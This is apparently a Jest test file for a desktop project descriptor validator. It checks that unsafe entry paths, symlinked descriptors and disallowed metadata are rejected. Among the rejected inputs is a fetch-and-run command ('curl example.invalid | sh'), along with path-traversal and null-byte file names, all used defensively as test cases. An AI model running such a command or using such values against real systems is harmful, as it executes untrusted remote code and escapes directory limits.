import fs from 'fs';
import os from 'os';
import path from 'path';
import { readDesktopProjectDescriptor, parseDesktopProjectDescriptor, validateDesktopProjectSource, requireDesktopBuiltFile, desktopSourceFileInventory } from './projectDesktopContract';
import { DESKTOP_PROJECT_TEMPLATES, DESKTOP_PROJECT_CATALOG } from './projectDesktopTemplates';
const roots: string[] = [];
const root = () => { const value = fs.mkdtempSync(path.join(os.tmpdir(), 'desktop-contract-')); roots.push(value); return value; };
afterEach(() => { roots.splice(0).forEach(value => fs.rmSync(value, { recursive: true, force: true })); });
it.each(DESKTOP_PROJECT_CATALOG)('ships a valid $id source tree with persistent data example', ({ id }) => {
  const directory = root(); const files = DESKTOP_PROJECT_TEMPLATES[id].files;
  for (const [relative, content] of Object.entries(files)) { fs.mkdirSync(path.dirname(path.join(directory, relative)), { recursive: true }); fs.writeFileSync(path.join(directory, relative), content); }
  const descriptor = readDesktopProjectDescriptor(directory)!; validateDesktopProjectSource(directory, descriptor);
  expect(Object.values(files).join('\n')).toContain('BRIDGESLLM_APP_DATA'); expect(descriptor.target).toBe('desktop');
});
it('does not invent a descriptor for an existing unmarked project', () => expect(readDesktopProjectDescriptor(root())).toBeNull());
it.each(['../app.js', '/tmp/app.js', 'build/../../app.js', 'build\\app.js', 'build//app.js', '-flag', 'a\0.js'])('rejects unsafe entry %p', entry => {
  expect(() => parseDesktopProjectDescriptor({ version: 1, target: 'desktop', language: 'typescript', interface: 'terminal', framework: 'node', entry })).toThrow();
});
it.each([{ uid: 0 }, { command: 'curl example.invalid | sh' }, { env: { SECRET: 'x' } }, { version: 2 }, { framework: 'electron' }])('rejects privilege/unknown/incompatible metadata %p', extra => {
  expect(() => parseDesktopProjectDescriptor({ version: 1, target: 'desktop', language: 'python', interface: 'terminal', framework: 'python', entry: 'main.py', ...extra })).toThrow();
});
it('rejects malformed metadata rather than falling through to web deployment', () => {
  const directory = root(); fs.writeFileSync(path.join(directory, 'portal-project.json'), '{'); expect(() => readDesktopProjectDescriptor(directory)).toThrow('not valid JSON');
});
it('rejects linked descriptors and build outputs', () => {
  const directory = root(); const outside = root(); fs.writeFileSync(path.join(outside, 'output'), '{}');
  fs.symlinkSync(path.join(outside, 'output'), path.join(directory, 'portal-project.json')); expect(() => readDesktopProjectDescriptor(directory)).toThrow();
  fs.symlinkSync(outside, path.join(directory, 'dist')); expect(() => requireDesktopBuiltFile(directory, 'dist/output')).toThrow();
});
it('accepts actual nested output and requires execute bits for native binaries', () => {
  const directory = root(); fs.mkdirSync(path.join(directory, 'dist')); fs.writeFileSync(path.join(directory, 'dist/main.js'), '');
  expect(requireDesktopBuiltFile(directory, 'dist/main.js')).toBe(path.join(directory, 'dist/main.js'));
  expect(() => requireDesktopBuiltFile(directory, 'dist/main.js', true)).toThrow(); fs.chmodSync(path.join(directory, 'dist/main.js'), 0o755);
  expect(requireDesktopBuiltFile(directory, 'dist/main.js', true)).toBeTruthy();
});
it('checks nested source, excludes build trees and refuses incomplete inventories', () => {
  const directory = root(); fs.mkdirSync(path.join(directory, 'src')); fs.mkdirSync(path.join(directory, 'target'));
  fs.writeFileSync(path.join(directory, 'src/app.py'), ''); fs.writeFileSync(path.join(directory, 'target/copy.py'), '');
  expect(desktopSourceFileInventory(directory, ['.py'])).toEqual(['src/app.py']); expect(() => desktopSourceFileInventory(directory, ['.py'], 0)).toThrow('too many');
});
